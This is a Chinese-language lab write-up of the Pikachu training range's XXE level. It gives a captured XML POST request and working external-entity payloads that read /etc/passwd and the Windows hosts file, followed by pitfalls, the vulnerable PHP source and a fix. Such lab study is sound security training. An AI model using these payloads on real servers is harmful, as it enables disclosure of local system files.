# Pikachu xxe_1.php 解题（XXE‑外部实体注入，读取本地文件）

> 
> 靶场地址：`/vul/xxe/xxe_1.php`

## 关卡原理

后端接收**XML 格式 POST 数据**，使用了**不安全的 libxml 解析器，没有禁用外部实体**。
我们可以构造 XML payload，引入外部文件实体，读取服务器本地文件（`/etc/passwd`）。

---

## 1、抓包

1. 打开页面，输入任意名字提交，打开 Burp 抓包。
2. 抓到原始 POST 请求，**请求体是 XML**
原始提交数据包：

```
POST /vul/xxe/xxe_1.php HTTP/1.1
Host: f0012fbf98204f57ae3bbf2cb76c8bce--8081.ap-shanghai2.cloudstudio.club
Content‑Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<user>
<name>test</name>
</user>
```

> 
> 重点：`Content‑Type` 必须是`application/xml`，不能是表单`x‑www‑form‑urlencoded`

## 2、Payload（读取本地文件 /etc/passwd）

完整攻击 XML，直接复制替换掉原来的`<user><name>test</name></user>`

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<user>
<name>&file;</name>
</user>
```

### 解释

1. `<!DOCTYPE xxe` ：定义文档类型，声明外部实体
2. `<!ENTITY file SYSTEM "file:///etc/passwd">`
   - `&file;` 实体名称
   - `SYSTEM` 代表外部资源
   - `file:///etc/passwd` php 读取本地文件协议
3. `<name>&file;</name>`：引用实体，解析时就会读取文件内容，输出到页面。

## 3、Windows 靶场备选 payload（如果你的靶场是 Windows 系统）

读取 C 盘 hosts 文件

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [
<!ENTITY file SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
]>
<user>
<name>&file;</name>
</user>
```

## 4、发送数据包（Burp Repeater）

把上面完整 XML 粘贴到请求体，发送，响应包就会返回`/etc/passwd`文件内容。

---

# 常见踩坑点（90% 失败的原因）

1. ❌ Content‑Type 写成`application/x-www-form-urlencoded`
   - XXE 必须提交`application/xml`
2. ❌ 少写 `&` 分号：`file` → `&file;` 实体引用必须带分号
3. ❌ 靶场 PHP 版本 libxml 开启了防御：高版本 libxml 默认禁用外部实体；pikachu 靶场代码手动关闭防护，所以可以成功。
4. ❌ URL 编码 XML 内容，**POST 请求体里面不要 URL 编码**，直接发明文 XML。

---

# 源码解析（xxe_1.php）

```
$xml = file_get_contents('php://input');
$dom = new DOMDocument();
$dom->loadXML($xml);
```

> 
> `php://input`接收原始 POST XML 数据，**没有禁用外部实体**，造成 XXE 漏洞。

## 修复方案

```
//禁止加载外部实体
libxml_disable_entity_loader(true);
```



这道题不懂怎么验证，待定